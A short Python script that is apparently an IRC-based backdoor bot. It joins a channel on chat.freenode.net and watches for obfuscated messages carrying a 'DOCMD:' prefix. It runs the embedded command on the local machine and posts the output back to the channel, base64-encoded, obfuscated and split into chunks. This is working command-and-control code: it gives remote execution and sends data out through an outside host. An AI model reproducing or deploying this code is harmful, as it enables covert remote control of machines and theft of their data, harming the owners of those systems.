import base64
import socket
import subprocess
from time import sleep

import muirc

HOST = 'chat.freenode.net'
PORT = 6665
NICK = 'botisek'
USERNAME = 'botiiiisek'
CHANNEL = '#blablabla'


def split_by_n(seq, n):
    while seq:
        yield seq[:n]
        seq = seq[n:]


conn = muirc.Connection(("chat.freenode.net", 6667))
conn.nick(NICK)
conn.user(NICK, NICK, NICK, NICK)
conn.join(CHANNEL)

for msg in conn:
    if msg['command'] == 'PRIVMSG' and len(msg['params']) == 2 and msg['params'][0] == CHANNEL:
        data = muirc.rot8000(msg['params'][1])
        if data.find('DOCMD:') != -1:
            try:
                result = subprocess.run(data.split(':', 2)[1].strip().split(), stdout=subprocess.PIPE).stdout
                cipher_text = muirc.rot8000(f'>{base64.b64encode(result).decode("utf-8")}') + '.'
                for chunk in split_by_n(cipher_text, 120):
                    conn.privmsg(CHANNEL, chunk)
                    sleep(.5)
            except Exception as e:
                print(e)
